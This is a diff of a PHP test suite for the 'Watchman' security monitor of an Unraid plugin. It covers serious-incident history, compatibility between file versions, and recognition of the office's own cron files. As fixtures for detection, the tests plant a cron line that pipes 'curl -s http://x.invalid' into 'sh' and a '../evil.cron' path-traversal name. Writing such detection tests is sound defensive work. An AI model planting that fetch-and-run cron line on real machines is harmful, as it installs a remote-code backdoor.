@@ -21761,8 +21761,9 @@ function testWatchmanGone(): void
 
 /**
  * «Acknowledge — this was serious»: the entry closes, nothing of it becomes normal, it goes into his history of serious
- * incidents (with a one-line note), and for WATCH_SERIOUS_DAYS the same kind from the same source is louder — told at
- * once (not held back by the hour's quiet), kept open against the team lead's note and his own noting.
+ * incidents (with a one-line note), and as long as it is there (2026-11-20, the owner: no end) the same kind from the same
+ * source is louder — told at once and as important (not held back by the hour's quiet), kept open against the team lead's
+ * note and his own noting. The list's file both ways across the update: `until` is still written for 1.94's reader.
  */
 function testWatchmanSerious(): void
 {
@@ -21822,8 +21823,8 @@ function testWatchmanSerious(): void
         [$r['ok'], watchmanOpen($e), $e['noted'], $e['by'], $e['serious'] ?? null]);
     same('serious: nothing of it becomes normal — the address stays unknown', false, isset($d['baseline']['ips']['10.9.8.7']));
     $inc = watchmanIncidents($data);
-    same('serious: in his history — what, when, the note as one line, louder for WATCH_SERIOUS_DAYS',
-        [1, $login['id'], 'login_new_ip', 'login_new_ip:10.9.8.7', 'Changed the root password and blocked it at the router', $now + 700 + WATCH_SERIOUS_DAYS * 86400],
+    same('serious: in his history — what, when, the note as one line; `until` 30 days on, for an office of 1.94 (its reader needs it)',
+        [1, $login['id'], 'login_new_ip', 'login_new_ip:10.9.8.7', 'Changed the root password and blocked it at the router', $now + 700 + WATCH_SERIOUS_OLD_DAYS * 86400],
         [count($inc), $inc[0]['id'], $inc[0]['kind'], $inc[0]['key'], $inc[0]['note'], $inc[0]['until']]);
     try {
         watchmanSerious($login['id'], '', $data, $now + 701, false);
@@ -21864,9 +21865,10 @@ function testWatchmanSerious(): void
     $s = watchmanPageState($data, $now + 1500, false);
     $byId = array_column($s['book'], null, 'id');
     same('serious page: entries marked', [true, false, true], [$byId[$login['id']]['serious'], $byId[$login['id']]['again'], $byId[$again['id']]['again']]);
-    same('serious page: the history with the note, louder, came back once', [1, 'login_new_ip', '10.9.8.7', true, 1, 'Changed the root password and blocked it at the router', WATCH_SERIOUS_DAYS],
+    same('serious page: the history with the note, louder, came back once — no number of days for the page any more',
+        [1, 'login_new_ip', '10.9.8.7', true, 1, 'Changed the root password and blocked it at the router', false],
         [count($s['incidents']), $s['incidents'][0]['kind'], $s['incidents'][0]['t']['ip'], $s['incidents'][0]['louder'], $s['incidents'][0]['again'],
-         $s['incidents'][0]['note'], $s['limits']['serious_days']]);
+         $s['incidents'][0]['note'], array_key_exists('serious_days', $s['limits'])]);
 
     // his own noting: an entry he would note by himself is kept open while louder; the round's old entries untouched
     $inc = watchmanIncidents($data);
@@ -21877,8 +21879,10 @@ function testWatchmanSerious(): void
     same('serious: noted by himself — open again while louder; what was there before or noted by the page stays', [1, null, true, false, $now],
         [watchmanSeriousAgain($b2, ['w0000000002' => 0], $inc, $now + 2000), $b2[0]['noted'], $b2[0]['important'], isset($b2[1]['again']), $b2[2]['noted']]);
     $b3 = $book;
-    same('serious: after WATCH_SERIOUS_DAYS as usual again', [0, $now],
-        [watchmanSeriousAgain($b3, [], $inc, $inc[0]['until'] + 1), $b3[0]['noted']]);
+    same('serious: no end — past the `until` an older office went by, and a year on, the same is still louder', [1, null, true],
+        [watchmanSeriousAgain($b3, ['w0000000002' => 0], $inc, $inc[0]['until'] + 365 * 86400), $b3[0]['noted'], $b3[0]['important']]);
+    $s = watchmanPageState($data, $inc[0]['until'] + 365 * 86400, false);
+    same('serious page: a year on, still louder', [true], array_column($s['incidents'], 'louder'));
 
     // his history read only in exactly its shape (a file by hand, an older or newer office's)
     file_put_contents("$data/incidents.json", json_encode(['v' => 1, 'incidents' => [
@@ -21886,8 +21890,52 @@ function testWatchmanSerious(): void
         ['id' => 'w0000000009', 'kind' => 'no_such_kind', 'key' => 'k', 'time' => 1, 'at' => 1, 'until' => 2, 'p' => []],
         ['id' => 'w000000000a', 'kind' => 'container_new', 'key' => 'container:x', 'time' => 1, 'at' => '1', 'until' => 2, 'p' => []],
         'nonsense',
-        ['id' => 'w000000000b', 'kind' => 'container_new', 'key' => 'container:x', 'time' => 1, 'at' => 1, 'until' => 2, 'p' => ['name' => 'x'], 'more' => 1]]]));
-    same('serious: only incidents in exactly their shape', ['w000000000b'], array_column(watchmanIncidents($data), 'id'));
+        ['id' => 'w000000000b', 'kind' => 'container_new', 'key' => 'container:x', 'time' => 1, 'at' => 1, 'until' => 2, 'p' => ['name' => 'x'], 'more' => 1],
+        ['id' => 'w000000000c', 'kind' => 'container_new', 'key' => 'container:y', 'time' => 1, 'at' => 1, 'p' => ['name' => 'y']],            // without until: a later office's
+        ['id' => 'w000000000d', 'kind' => 'container_new', 'key' => 'container:z', 'time' => 1, 'at' => 1, 'until' => '2', 'p' => []]]]));      // until, but no number
+    same('serious: only incidents in exactly their shape (`until` a number or not there)', ['w000000000b', 'w000000000c'], array_column(watchmanIncidents($data), 'id'));
+
+    // the update, one way: a list 1.94 wrote (`until` 30 days on, here long over) — read as it is, and louder, since the
+    // incident is on the list (incidents recorded before the change count, their 30 days over or not)
+    $old = ['id' => 'w0000000e01', 'kind' => 'login_new_ip', 'key' => 'login_new_ip:10.9.8.9', 'time' => $now - 90 * 86400, 'last' => $now - 90 * 86400, 'count' => 1,
+            'p' => ['ip' => '10.9.8.9'], 'at' => $now - 89 * 86400, 'until' => $now - 59 * 86400, 'note' => 'from 1.94'];
+    file_put_contents("$data/incidents.json", json_encode(['v' => 1, 'incidents' => [$old]]));
+    $b4 = [['id' => 'w0000000e02', 'kind' => 'login_new_ip', 'key' => 'login_new_ip:10.9.8.9', 'noted' => $now, 'by' => 'office']];
+    same('serious update: a list of 1.94 with its 30 days over — read, still louder (the page says so)', [['w0000000e01'], 1, true, [true]],
+        [array_column(watchmanIncidents($data), 'id'), watchmanSeriousAgain($b4, [], watchmanIncidents($data), $now), $b4[0]['important'],
+         array_column(watchmanPageState($data, $now, false)['incidents'], 'louder')]);
+    // … and an entry of a newer shape in the list stays when one more is recorded (the writer keeps what it doesn't know)
+    $raw = json_decode((string) file_get_contents("$data/incidents.json"), true);
+    $raw['incidents'][] = ['id' => 'w0000000e03', 'kind' => 'some_newer_kind', 'key' => 'x', 'time' => 1, 'at' => 1, 'p' => []];
+    $raw['newer'] = ['kept' => true];
+    file_put_contents("$data/incidents.json", json_encode($raw));
+    file_put_contents($paths['syslog'], $line($now + 1600, 'webgui: Successful login user root from 10.9.8.20'), FILE_APPEND);
+    watchmanRound($paths, $data, 1000, $now + 1700, $docker, true, $acks);
+    $new = array_values(array_filter($openOf('login_new_ip'), fn ($e) => $e['key'] === 'login_new_ip:10.9.8.20'))[0] ?? null;
+    watchmanSerious((string) ($new['id'] ?? 'w0000000000'), 'second', $data, $now + 1800, false);
+    $raw = json_decode((string) file_get_contents("$data/incidents.json"), true);
+    same('serious update: recording one more keeps what it doesn\'t know — the old one, the newer shape, the file\'s other keys', [['w0000000e01', 'w0000000e03', $new['id'] ?? '?'], ['kept' => true], 1],
+        [array_column($raw['incidents'], 'id'), $raw['newer'] ?? null, $raw['v'] ?? null]);
+    // the other way: what 1.94.1's reader (its watchmanIncidents() and watchmanSeriousAgain(), as they are in v1.94.1,
+    // copied here) makes of the file this office wrote — every entry of ours in its shape (an int `until`), louder for
+    // its 30 days from `until` as 1.94 always did, after them as usual
+    $old194 = function (string $dir, int $at): array {
+        $out = $hot = [];
+        foreach ((array) (readJson("$dir/incidents.json")['incidents'] ?? []) as $x) {
+            if (is_array($x) && is_string($x['id'] ?? null) && preg_match(WATCH_ID, $x['id']) && is_string($x['kind'] ?? null) && isset(WATCH_KINDS[$x['kind']])
+                && is_string($x['key'] ?? null) && is_int($x['at'] ?? null) && is_int($x['until'] ?? null) && is_int($x['time'] ?? null)
+                && is_array($x['p'] ?? null) && is_string($x['note'] ?? '')) {
+                $out[] = $x['id'];
+                if ($x['until'] > $at) {
+                    $hot[] = $x['id'];
+                }
+            }
+        }
+        return [$out, $hot];
+    };
+    same('serious update: 1.94.1 reads the file this office wrote — ours in its shape, louder for 30 days from the record, then as before',
+        [[['w0000000e01', $new['id'] ?? '?'], [$new['id'] ?? '?']], [['w0000000e01', $new['id'] ?? '?'], []]],
+        [$old194($data, $now + 1800 + 86400), $old194($data, $now + 1800 + WATCH_SERIOUS_OLD_DAYS * 86400 + 1)]);
     @unlink("$data/incidents.json");
     same('serious: no history yet — none, and the page says so', [[], []], [watchmanIncidents($data), watchmanPageState($data, $now, false)['incidents']]);
 
@@ -22997,6 +23045,171 @@ function testWatchmanOffice(): void
     putenv($envBefore === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$envBefore");
     @unlink(watchmanLockFile($data, 'book'));
     exec('rm -rf ' . escapeshellarg($tmp));
+}
+
+/**
+ * The office's own cron files beside its schedules (2026-11-20, the owner: «the Watchman doesn't know the office's own
+ * colleague yet» — the fan desk's guard line came into the book at its first «Take over»): the agent's watch
+ * (agent-watch.cron, scripts/agent.sh), the USO network's look (usonet.cron) and what a desk says it writes (desk(…,
+ * ['cron' => …])) are known line by line, exactly as written — noted by himself once per file, never open, never told;
+ * taken over and handed back again and again: nothing new; any other line there stays news; an old entry stays as it was.
+ * He learns them without the desk's name in his own file (the fan desk keeps its name out of other files: testFanboyPublic).
+ */
+function testWatchmanOwnCron(): void
+{
+    // the lines he knows are exactly what the writers write: agent.sh's WATCH_LINE and the fan desk's guard writer
+    $agentSh = (string) file_get_contents(OFFICE_DIR . '/plugin/scripts/agent.sh');
+    same('own cron: the agent\'s watch line he knows is exactly agent.sh\'s WATCH_LINE', WATCH_AGENT_CRON,
+        str_replace('$DIR', '/usr/local/emhttp/plugins/unraid-secretary-office', preg_match('/^WATCH_LINE="(.*)"$/m', $agentSh, $m) ? $m[1] : '?'));
+    $own = watchmanOwnCron();
+    $files = array_keys($own);
+    sort($files);
+    same('own cron: the office\'s own files — the agent\'s watch, the USO network\'s, and the one a desk says it writes (its guard)',
+        [['agent-watch.cron', 'fanboy-guard.cron', 'usonet.cron'], [WATCH_AGENT_CRON], [WATCH_USONET_CRON]], [$files, $own['agent-watch.cron'], $own['usonet.cron']]);
+    check('own cron: the night watchman\'s file never names the desk (he asks every desk: desk(…, [\'cron\' => …]))',
+        stripos((string) file_get_contents(OFFICE_DIR . '/agent/desks/watchman.php'), 'fanboy') === false
+        && stripos((string) file_get_contents(OFFICE_DIR . '/agent/lib/util.php'), 'fanboy') === false);
+    // what a desk may say: a cron file's name in the office's folder (never the schedules' own, never a path), job lines only
+    $keepDesks = $GLOBALS['desks'];
+    $GLOBALS['desks']['zz-test'] = ['cron' => fn () => ['../evil.cron' => ['* * * * * x'], 'unraid-secretary-office.cron' => ['* * * * * x'], 'usonet.cron' => ['* * * * * x'],
+        'Upper.cron' => ['* * * * * x'], 'fine.cron' => ["# a comment\n", '  0   3 * * *   bash  /x/y.sh  ', 'not a cron line', 7]]] + $keepDesks['watchman'];
+    $GLOBALS['desks']['zz-broken'] = ['cron' => fn () => 'nothing'] + $keepDesks['watchman'];
+    $own = watchmanOwnCron();
+    $GLOBALS['desks'] = $keepDesks;
+    same('own cron: a desk\'s word taken only in exactly its shape — a path, the schedules\' file, a file already known, another name: left out; its job lines with the spaces as he reads them',
+        [false, false, [WATCH_USONET_CRON], false, ['0 3 * * * bash /x/y.sh']], [isset($own['../evil.cron']), isset($own['unraid-secretary-office.cron']), $own['usonet.cron'],
+         isset($own['Upper.cron']), $own['fine.cron'] ?? null]);
+
+    $tmp = hardeningTmp('watchman-own-cron');
+    $src = "$tmp/src";
+    $data = "$tmp/data";
+    $root = "$tmp/root";                                    // the fan desk's tree: his guard writes its file there (fanboySysRoot())
+    $flash = "$root/boot/config/plugins";
+    foreach (['crontabs', 'cron.d', 'logplugins', 'atjobs', 'agents', 'extra', 'ssh'] as $d) {
+        @mkdir("$src/$d", 0700, true);
+    }
+    @mkdir("$flash/unraid-secretary-office", 0700, true);
+    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/logplugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
+              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini", 'share_cfg' => "$src/share.cfg",
+              'etc_passwd' => "$src/passwd", 'crontabs' => "$src/crontabs", 'cron_d' => "$src/cron.d", 'cron_files' => $flash,
+              'userscripts' => "$flash/user.scripts", 'atjobs' => "$src/atjobs", 'agents' => "$src/agents"];
+    file_put_contents($paths['passwd'], "root:x:0:0::/root:/bin/bash\n");
+    file_put_contents($paths['go'], "#!/bin/bash\n");
+    file_put_contents($paths['syslog'], '');
+    file_put_contents("$src/crontabs/root", "# nothing of root's own\n");
+    file_put_contents("$src/logplugins/unraid-secretary-office.plg", "<PLUGIN name=\"unraid-secretary-office\" version=\"1\">\n");
+    $office = "$flash/unraid-secretary-office";
+    $watchHead = "# Unraid Secretary Office - is the agent at work? (written by scripts/agent.sh)\n";
+    // an older agent wrote another watch line (every 10 minutes): what he learns when he takes over the watch
+    file_put_contents("$office/agent-watch.cron", $watchHead . "*/10 * * * * bash /usr/local/emhttp/plugins/unraid-secretary-office/scripts/job.sh watch > /dev/null 2>&1\n");
+    file_put_contents("$office/unraid-secretary-office.cron", '0 1 * * * ' . officeJobCommand('backup') . "\n");
+    $notified = "$tmp/notified";
+    file_put_contents("$tmp/notify", "#!/bin/bash\necho \"\$*\" >> " . escapeshellarg($notified) . "\n");
+    chmod("$tmp/notify", 0755);
+    $envBefore = [getenv('OFFICE_NOTIFY_BIN'), getenv('OFFICE_FANBOY_ROOT')];
+    putenv("OFFICE_NOTIFY_BIN=$tmp/notify");
+    putenv("OFFICE_FANBOY_ROOT=$root");
+    try {
+        $docker = fn () => [];
+        $now = 2_000_000_000;
+        // a book that already has the old entry (1.95's first «Take over» before this fix: the guard's line as news): kept as
+        // it was, open — history (never closed as «as it was again»)
+        watchmanRound($paths, $data, 1000, $now, $docker, true);
+        $snap = watchmanLoad($data);
+        $old = watchmanEntry('cron_file', 'cron_file:unraid-secretary-office/fanboy-guard.cron', $now - 86400,
+            ['file' => 'unraid-secretary-office/fanboy-guard.cron', 'plugin' => 'unraid-secretary-office', 'new' => true, 'office' => true, 'lines' => 1, 'jobs' => ['* * * * * grep …'], '_h' => [watchmanHash(fanboyGuardCronLine())]]);
+        watchmanSave($data, ['book' => $snap['book']], ['book' => [...$snap['book'], $old]]);
+        $round = function (int $t) use ($paths, $data, $docker): array {
+            clearstatcache();
+            return watchmanRound($paths, $data, 1000, $t, $docker, true);
+        };
+        $ours = fn () => array_values(array_filter(watchmanLoad($data)['book'], fn ($e) => ($e['by'] ?? null) === 'office_cron'));
+        $opened = fn () => array_values(array_map(fn ($e) => $e['key'], array_filter(watchmanLoad($data)['book'], fn ($e) => watchmanOpen($e) && $e['id'] !== $old['id'])));
+
+        // «Take over»: the guard's file as his desk writes it — the office's own: noted by himself, not open, not told
+        fanboyGuardCron(true);
+        $r = $round($now + 300);
+        $o = $ours();
+        same('own cron: the guard written at «Take over» — one line noted by himself, nothing open, nothing told', [[], [], [], 1, 'cron_file:unraid-secretary-office/fanboy-guard.cron', false, true, null],
+            [$r['added'], $r['told'], $opened(), count($o), $o[0]['key'] ?? null, watchmanOpen($o[0] ?? []), $o[0]['p']['office_file'] ?? null, $o[0]['p']['office'] ?? null]);
+        // hand back and take over again, several times: nothing new; a month later (the file forgotten) still the one line
+        $t = $now + 300;
+        foreach ([false, true, false, true, false, true] as $on) {
+            fanboyGuardCron($on);
+            $t += 60;
+            if ($on) {
+                touch("$office/fanboy-guard.cron", $t);             // (touch() on a file gone would make an empty one)
+            }
+            $r = $round($t);
+            if ($r['added'] || $r['told']) {
+                break;
+            }
+        }
+        same('own cron: «Hand back» and «Take over» three times in a row — nothing added, nothing told, still one line', [[], [], [], 1],
+            [$r['added'], $r['told'], $opened(), count($ours())]);
+        fanboyGuardCron(false);
+        $round($t += 60);
+        $t += WATCH_FORGET + 3600;
+        $round($t);
+        fanboyGuardCron(true);
+        $r = $round($t += 60);
+        same('own cron: back after a month (the file forgotten meanwhile) — the same line refreshed, no second one', [[], [], 1, 2],
+            [$r['added'], $opened(), count($o = $ours()), $o[0]['count'] ?? null]);
+        $kept = array_values(array_filter(watchmanLoad($data)['book'], fn ($e) => $e['id'] === $old['id']));
+        same('own cron: the entry an older version wrote stays as it was (open, its words) — the book is history', [$old], $kept);
+        // the owner's «I know, thanks» on that old entry; then another line in his file is news (a plain plugin schedule
+        // entry: open, its file the office's own, not its schedule)
+        $b = watchmanLoad($data)['book'];
+        watchmanSave($data, ['book' => $b], ['book' => array_map(fn ($e) => $e['id'] === $old['id'] ? ['noted' => $t] + $e : $e, $b)]);
+        file_put_contents("$office/fanboy-guard.cron", file_get_contents("$office/fanboy-guard.cron") . "*/2 * * * * curl -s http://x.invalid | sh\n");
+        touch("$office/fanboy-guard.cron", $t += 60);
+        $r = $round($t);
+        $book = watchmanLoad($data)['book'];
+        $news = array_values(array_filter($book, fn ($e) => watchmanOpen($e) && $e['id'] !== $old['id']));
+        same('own cron: a line the office doesn\'t write there — open (an entry of its own), only that line, the file named as the office\'s own',
+            [['cron_file'], ['cron_file:unraid-secretary-office/fanboy-guard.cron'], [watchmanCronShort('*/2 * * * * curl -s http://x.invalid | sh')], true, null],
+            [$r['added'], array_column($news, 'key'), $news[0]['p']['jobs'] ?? null, $news[0]['p']['office_file'] ?? null, $news[0]['p']['office'] ?? null]);
+        fanboyGuardCron(false);
+        fanboyGuardCron(true);
+        touch("$office/fanboy-guard.cron", $t += 60);
+        $round($t);
+
+        // the agent's watch: an update writes it anew (another line than the older agent's) — the office's own, noted
+        file_put_contents("$office/agent-watch.cron", $watchHead . WATCH_AGENT_CRON . "\n");
+        touch("$office/agent-watch.cron", $t += 60);
+        $before = count($opened());
+        $r = $round($t);
+        same('own cron: the agent\'s watch line changed by an update — noted by himself, nothing open, nothing told', [[], [], $before, true],
+            [$r['added'], $r['told'], count($opened()), in_array('cron_file:unraid-secretary-office/agent-watch.cron', array_column($ours(), 'key'), true)]);
+        // … gone with a removal, back with a new install a month later: the same
+        unlink("$office/agent-watch.cron");
+        $round($t += 60);
+        $round($t += WATCH_FORGET + 3600);
+        file_put_contents("$office/agent-watch.cron", $watchHead . WATCH_AGENT_CRON . "\n");
+        touch("$office/agent-watch.cron", $t += 60);
+        $r = $round($t);
+        same('own cron: the watch back after a reinstall a month later — no news', [[], [], $before], [$r['added'], $r['told'], count($opened())]);
+        // the schedules' file stays the schedules' (a time set on a desk's page): noted as before, by `schedule`
+        file_put_contents("$office/unraid-secretary-office.cron", '0 2 * * * ' . officeJobCommand('backup') . "\n");
+        touch("$office/unraid-secretary-office.cron", $t += 60);
+        $r = $round($t);
+        $sched = array_values(array_filter(watchmanLoad($data)['book'], fn ($e) => ($e['by'] ?? null) === 'schedule'));
+        same('own cron: the schedules\' file as before — a time changed on a desk\'s page, noted by `schedule`, with the office\'s mark', [[], 1, true],
+            [$r['added'], count($sched), $sched[0]['p']['office'] ?? null]);
+        // another file in the office's folder is nobody's own: news, and never called the office's
+        file_put_contents("$office/extra.cron", "* * * * * bash /tmp/x.sh\n");
+        touch("$office/extra.cron", $t += 60);
+        $r = $round($t);
+        $extra = array_values(array_filter(watchmanLoad($data)['book'], fn ($e) => ($e['p']['file'] ?? '') === 'unraid-secretary-office/extra.cron'));
+        same('own cron: a file in the office\'s folder it doesn\'t write — open, neither its schedules nor its own', [['cron_file'], 1, true, false, false],
+            [$r['added'], count($extra), watchmanOpen($extra[0] ?? []), isset($extra[0]['p']['office']), isset($extra[0]['p']['office_file'])]);
+        same('own cron: nothing of the office\'s own was told on the way', '', (string) @file_get_contents($notified));
+    } finally {
+        putenv($envBefore[0] === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN={$envBefore[0]}");
+        putenv($envBefore[1] === false ? 'OFFICE_FANBOY_ROOT' : "OFFICE_FANBOY_ROOT={$envBefore[1]}");
+        @unlink(watchmanLockFile($data, 'book'));
+        hardeningRm($tmp);
+    }
 }
 
 /**
@@ -66286,7 +66499,7 @@ function testSkipPlaces(): void
 $parts = ['logic' => ['testCron', 'testRetention', 'testPlanGone', 'testSnapPlansTolerant', 'testSnapPlanIdNeverReused', 'testSleepingPools', 'testSnapshotNames', 'testJack', 'testJackPlan', 'testJackShadow', 'testJackShadowPython', 'testJackNoPython', 'testJackRun', 'testJackStructure', 'testJackWatch', 'testJackSizes', 'testJackShareDataset', 'testJackPool', 'testJackImport', 'testJackForeign', 'testOfficeCron', 'testCaretakerCronLook', 'testMenuName', 'testSetupListDiff', 'testNoScriptNames', 'testPhpVarNames', 'testDetailsKept', 'testSetupDiscard', 'testWhereArrayZfs', 'testEstimates', 'testBackupFirstUpload', 'testBackupRough', 'testNotify', 'testNotifyLayout', 'testNotifyCenter', 'testCaretakerAcks', 'testAckContent', 'testCaretakerAckDrift', 'testJackLetGo', 'testJackMover', 'testJackGatherCache', 'testJackRsync', 'testJackTidyDisks', 'testJackKeyRedirect', 'testJackUpstream', 'testJackPersons', 'testJackNotInBudget', 'testJackProgress', 'testJackReadyShares',
                       'testLogsFlood',
                       'testMoverelliFit', 'testMoverelliIni', 'testMoverelliIniTolerant', 'testMoverelliMoveBin', 'testMoverelliRun', 'testMoverelliGates', 'testMoverelliForeign', 'testMoverelliPage', 'testRefusedRowWords', 'testMoverelliImport', 'testNightPlan', 'testNightRun', 'testJackChaos', 'testNightOrder', 'testNightHerPool', 'testNightPicture', 'testMoverelliRunPicture', 'testNightJackCard', 'testNightJackInHerCard', 'testNightSteps', 'testNightReserve', 'testNightSnaps', 'testPoolJackOutside', 'testPoolNonZfs', 'testMoverelliSharesGone', 'testMoverelliTiles', 'testMoverelliSuggestJack', 'testMoverelliUnraid', 'testMoverelliUnraidProgress', 'testMoverelliStop', 'testMoverelliArrayStop', 'testMoverelliPowerCut', 'testMoverelliNothingMoved', 'testMoverelliCardLag', 'testMoverelliCardFile', 'testMoverelliLeftWhy', 'testMoverelliSyncMoved', 'testMoverelliTwins', 'testMoverelliEta', 'testMoverelliPreferDisks', 'testMoverelliTidy', 'testMoverelliShareRoot', 'testMoverelliTrailingSpace', 'testMoverelliFuture', 'testMoverelliLeftCodesPage', 'testOfficeFmtSize', 'testMoverelliIdleRules', 'testMoverelliPageTruth', 'testMoverJackTruthRest', 'testGreetTruth', 'testMoverelliFill', 'testPoolLevel', 'testPoolBytes', 'testStreamerTab', 'testJackRemoveServer', 'testJackSaveReconnect', 'testJackConnectNoChange', 'testJackByWords', 'testStreamerBudget', 'testStreamerReset', 'testStreamerFix3', 'testDialogSeen', 'testStreamerShares', 'testJackYield',
-                      'testBackupPackages', 'testBackupKopiaItems', 'testBackupKopiaSplitTags', 'testBackupKopiaWord', 'testBackupNewLocal', 'testBackupNewLocalOffice', 'testBackupPlace', 'testSetupUnfold', 'testSetupFilter', 'testSetupTiles', 'testSetupFirstPlace', 'testBackupPlaceOffer', 'testSetupAsleepKept', 'testSetupGoneApp', 'testSetupStoppedKept', 'testSetupNoDocker', 'testSetupBom', 'testSetupDupKey', 'testSetupUntrusted', 'testSetupKopiaGone', 'testSetupDockerOffKeeps', 'testSetupOldUserScript', 'testSetupPoolGone', 'testBackupPresets', 'testBackupSkip', 'testBackupVmOrder', 'testBackupVmWarn', 'testBackupBtrfsBrake', 'testPartnerAtOnce', 'testBackupArrayStop', 'testBackupPruneOwn', 'testBackupKopiaAutostart', 'testBackupKopiaOrder', 'testAgentBackupHooks', 'testBackupRecoverNotes', 'testDataTrust', 'testBackupScheduledUnset', 'testBackupNotifyLang', 'testBackupNotifyItems', 'testNotifyPlain', 'testJackStreamerName', 'testRetentionPartner', 'testOfficeHome', 'testBackupEpipe', 'testBackupPartnerPhase', 'testBackupInside', 'testBackupPartnerOffice', 'testBackupReview172', 'testBackupFlashNever', 'testPartnerEnded', 'testBackupAnewChoice', 'testPartnerStaleName', 'testBackupAsleep', 'testBackupAsleepOffice', 'testIcons', 'testIconSquare', 'testRestore', 'testRestoreJobs', 'testRestoreRunCard', 'testJobStale', 'testJobSilentRuns', 'testNoWallWaits', 'testRestoreVmFit', 'testRestoreVmForeign', 'testRestoreStack', 'testSetupMakeDataset', 'testSetupMakeFolder', 'testRestoreShares', 'testRestoreSnapsHold', 'testRestorePaths', 'testRestoreBrowse', 'testRestoreNextcloud', 'testRestoreFindings', 'testRestoreDatabases', 'testRestoreDbStopped', 'testRestoreNames', 'testRestoreInUse', 'testRestoreSettled', 'testRestoreUnfinished', 'testRestoreArrayStopWhy', 'testRestoreMeasuring', 'testRestorePutbackDb', 'testRestoreConfigNoTemplate', 'testRestoreDrill', 'testDrillSqliteAppIndex', 'testDrillShareFile', 'testDrillImageData', 'testSnapRead', 'testDrillSnapRead', 'testRenameFree', 'testRestorePartner', 'testRestoreMoveGuide', 'testPartnerTicket', 'testPartnerDoorDocs', 'testPartnerRepair', 'testPartnerStart', 'testWatchmanTicket', 'testPartnerSendBack', 'testWatchmanPartner', 'testWatchmanNet', 'testWatchmanNetIpsFamilies', 'testWatchmanNetMikrotik', 'testSnapshotPartner', 'testSnapshotBusy', 'testVmOrphans', 'testCleanupPartner', 'testLogsPartner', 'testAdvisor', 'testAdvisorDockerOff', 'testAdvisorInstall', 'testAdvisorOldTemplate', 'testAdvisorRecord', 'testAdvisorObjectLock', 'testAdvisorPartnerGuide', 'testLogsTour', 'testTruthLogsWatch', 'testLogsRules', 'testLogsPlugins', 'testLogsMine', 'testLogsFilters', 'testLogsFiltersPage', 'testLogsWakes', 'testLogsWakeTrail', 'testMetrics', 'testWatchman', 'testWatchmanGone', 'testWatchmanSerious', 'testWatchmanSeriousUndo', 'testWatchmanAtUserScript', 'testWatchmanSched', 'testWatchmanOffice', 'testWatchmanFlow', 'testWatchmanFlowPull', 'testWatchmanFlowGone', 'testWatchmanFlowFiles', 'testWatchmanPosture', 'testWatchmanPrivilegedStopped', 'testWatchmanSnaps', 'testWatchmanHost', 'testWatchmanNight', 'testWatchmanBoot', 'testNightUi', 'testJobGuard', 'testComposeBuilds', 'testUnraidPath', 'testExclusive', 'testWatchmanGoLines', 'testWatchmanFlowSources', 'testWatchmanNetMikrotikBook', 'testAdvisorMikrotikGuide', 'testDashboardJobs', 'testBackupKopiaOrphans', 'testBackupOldSourcesPage', 'testKopiaEmptied', 'testKopiaEmptiedCache', 'testBackupFutureFiles', 'testKopiaLockGuard', 'testBackup74Polish', 'testBackupAppShare', 'testSetupLeftUnsaved', 'testTipNeverKept', 'testSilentControlsMore', 'testBackupAsleepNoMust', 'testSetupUnknownKey', 'testBackupVolumeCache', 'testBackupGonePackage', 'testBackupMovedPackage', 'testSetupApplyHonest', 'testSetupViaShare', 'testSetupTravelPicture', 'testBackupTruthProtection', 'testBackupTruthShares', 'testBackupResults', 'testRestoreTruthChips', 'testSetupOwnDatasetApply', 'testBackupNcOpen', 'testBackupPausedStopped', 'testSetupSearch', 'testBackupPlaceVerdict', 'testWatchmanFlowGuess', 'testWatchmanGuessMore', 'testBackupLastRunEnded', 'testOffsiteReach', 'testDockerSilent', 'testKopiaHang', 'testKopiaWatch', 'testWatchmanHold', 'testBackupBatchH', 'testBackupRetention',
+                      'testBackupPackages', 'testBackupKopiaItems', 'testBackupKopiaSplitTags', 'testBackupKopiaWord', 'testBackupNewLocal', 'testBackupNewLocalOffice', 'testBackupPlace', 'testSetupUnfold', 'testSetupFilter', 'testSetupTiles', 'testSetupFirstPlace', 'testBackupPlaceOffer', 'testSetupAsleepKept', 'testSetupGoneApp', 'testSetupStoppedKept', 'testSetupNoDocker', 'testSetupBom', 'testSetupDupKey', 'testSetupUntrusted', 'testSetupKopiaGone', 'testSetupDockerOffKeeps', 'testSetupOldUserScript', 'testSetupPoolGone', 'testBackupPresets', 'testBackupSkip', 'testBackupVmOrder', 'testBackupVmWarn', 'testBackupBtrfsBrake', 'testPartnerAtOnce', 'testBackupArrayStop', 'testBackupPruneOwn', 'testBackupKopiaAutostart', 'testBackupKopiaOrder', 'testAgentBackupHooks', 'testBackupRecoverNotes', 'testDataTrust', 'testBackupScheduledUnset', 'testBackupNotifyLang', 'testBackupNotifyItems', 'testNotifyPlain', 'testJackStreamerName', 'testRetentionPartner', 'testOfficeHome', 'testBackupEpipe', 'testBackupPartnerPhase', 'testBackupInside', 'testBackupPartnerOffice', 'testBackupReview172', 'testBackupFlashNever', 'testPartnerEnded', 'testBackupAnewChoice', 'testPartnerStaleName', 'testBackupAsleep', 'testBackupAsleepOffice', 'testIcons', 'testIconSquare', 'testRestore', 'testRestoreJobs', 'testRestoreRunCard', 'testJobStale', 'testJobSilentRuns', 'testNoWallWaits', 'testRestoreVmFit', 'testRestoreVmForeign', 'testRestoreStack', 'testSetupMakeDataset', 'testSetupMakeFolder', 'testRestoreShares', 'testRestoreSnapsHold', 'testRestorePaths', 'testRestoreBrowse', 'testRestoreNextcloud', 'testRestoreFindings', 'testRestoreDatabases', 'testRestoreDbStopped', 'testRestoreNames', 'testRestoreInUse', 'testRestoreSettled', 'testRestoreUnfinished', 'testRestoreArrayStopWhy', 'testRestoreMeasuring', 'testRestorePutbackDb', 'testRestoreConfigNoTemplate', 'testRestoreDrill', 'testDrillSqliteAppIndex', 'testDrillShareFile', 'testDrillImageData', 'testSnapRead', 'testDrillSnapRead', 'testRenameFree', 'testRestorePartner', 'testRestoreMoveGuide', 'testPartnerTicket', 'testPartnerDoorDocs', 'testPartnerRepair', 'testPartnerStart', 'testWatchmanTicket', 'testPartnerSendBack', 'testWatchmanPartner', 'testWatchmanNet', 'testWatchmanNetIpsFamilies', 'testWatchmanNetMikrotik', 'testSnapshotPartner', 'testSnapshotBusy', 